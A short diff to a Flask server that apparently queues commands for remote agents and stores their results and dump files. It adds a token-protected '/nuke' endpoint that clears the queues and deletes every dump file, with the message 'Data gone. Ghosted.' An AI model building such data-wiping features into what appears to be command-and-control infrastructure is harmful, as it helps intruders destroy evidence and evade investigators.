@@ -115,5 +115,23 @@ def get_results(agent_id):
         return jsonify({"output": None})
     return jsonify({"output": output})
 
+@app.route('/nuke', methods=['POST'])
+@require_token
+def nuke_server():
+    command_queue.clear()
+    command_results.clear()
+
+    # Optional: delete dump files
+    dump_path = os.path.join(app.root_path, 'dumps')
+    if os.path.exists(dump_path):
+        for f in os.listdir(dump_path):
+            try:
+                os.remove(os.path.join(dump_path, f))
+            except Exception as e:
+                print(f"Error deleting {f}: {e}")
+
+    return jsonify({"status": "🔥 Server nuked. Data gone. Ghosted."})
+
+
 if __name__ == '__main__':
     app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
